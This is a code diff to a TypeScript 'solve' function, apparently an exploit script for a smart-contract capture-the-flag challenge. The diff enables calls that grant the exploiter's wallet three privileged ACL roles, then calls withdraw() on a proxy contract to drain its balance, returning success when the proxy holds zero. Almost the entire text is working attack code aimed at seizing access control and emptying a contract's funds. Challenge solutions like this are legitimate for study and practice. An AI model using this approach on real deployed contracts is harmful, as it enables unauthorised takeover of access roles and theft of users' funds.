@@ -53,40 +53,23 @@ export const solve = async (exploiter: Sender, proxyAddress: string): Promise<bo
     console.log('ACL address: ', aclAddress);
     console.log('ACL balance: ', aclBalance);
 
-    // {
-    //     {
-    //         const data = abi.simpleEncode("setACLRole7123909213907581092(address)", exploiter.wallet.getChecksumAddressString());
-    //         const res = await exploiter.callContract(aclAddress, data);
-    //         console.log(res);
-    //     }
-    //     {
-    //         const data = abi.simpleEncode("setACLRole8972381298910001230(address)", exploiter.wallet.getChecksumAddressString());
-    //         const res = await exploiter.callContract(aclAddress, data);
-    //         console.log(res);
-    //     }
-    //     {
-    //         const data = abi.simpleEncode("setACLRole5999294130779334338(address)", exploiter.wallet.getChecksumAddressString());
-    //         const res = await exploiter.callContract(aclAddress, data);
-    //         console.log(res);
-    //     }
-    // }
-    // {
-    //     {
-    //         const data = abi.simpleEncode("getACLRole7123909213907581092()");
-    //         const res = await exploiter.viewContract(aclAddress, data);
-    //         console.log('Role712:', res);
-    //     }
-    //     {
-    //         const data = abi.simpleEncode("getACLRole8972381298910001230()");
-    //         const res = await exploiter.viewContract(aclAddress, data);
-    //         console.log('Role897:', res);
-    //     }
-    //     {
-    //         const data = abi.simpleEncode("getACLRole5999294130779334338()");
-    //         const res = await exploiter.viewContract(aclAddress, data);
-    //         console.log('Role599:', res);
-    //     }
-    // }
+    {
+        {
+            const data = abi.simpleEncode("setACLRole7123909213907581092(address)", exploiter.wallet.getChecksumAddressString());
+            const res = await exploiter.callContract(aclAddress, data);
+            console.log(res);
+        }
+        {
+            const data = abi.simpleEncode("setACLRole8972381298910001230(address)", exploiter.wallet.getChecksumAddressString());
+            const res = await exploiter.callContract(aclAddress, data);
+            console.log(res);
+        }
+        {
+            const data = abi.simpleEncode("setACLRole5999294130779334338(address)", exploiter.wallet.getChecksumAddressString());
+            const res = await exploiter.callContract(aclAddress, data);
+            console.log(res);
+        }
+    }
     {
         {
             const res = await exploiter.getStorageAt(aclAddress, new BN(1));
@@ -102,20 +85,20 @@ export const solve = async (exploiter: Sender, proxyAddress: string): Promise<bo
         }
     }
     
-    // {
-    //     const data = abi.simpleEncode("balance()");
-    //     const res = await exploiter.viewContract(proxyAddress, data);
-    //     console.log('balance:', web3.utils.hexToNumberString(res));
-    // }
+    {
+        const data = abi.simpleEncode("balance()");
+        const res = await exploiter.viewContract(proxyAddress, data);
+        console.log('balance:', web3.utils.hexToNumberString(res));
+    }
 
-    // const data = abi.simpleEncode("withdraw()");
-    // const res = await exploiter.callContract(proxyAddress, data, { value: '2000', unit: 'finney'});
-    // console.log('withdraw() called:', res);
+    const data = abi.simpleEncode("withdraw()");
+    const res = await exploiter.callContract(proxyAddress, data, { value: '2000', unit: 'finney'});
+    console.log('withdraw() called:', res);
 
-    // console.log('exploiter balance: ', await exploiter.balance('ether'));
-    // const afterBalance = await exploiter.getBalance(proxyAddress, 'ether');
-    // console.log(`====== proxy balance ======`);
-    // console.log(' - before: ', beforeBalance);
-    // console.log(' - after : ', afterBalance);
-    return false;
+    console.log('exploiter balance: ', await exploiter.balance('ether'));
+    const afterBalance = await exploiter.getBalance(proxyAddress, 'ether');
+    console.log(`====== proxy balance ======`);
+    console.log(' - before: ', beforeBalance);
+    console.log(' - after : ', afterBalance);
+    return afterBalance == '0';
 }
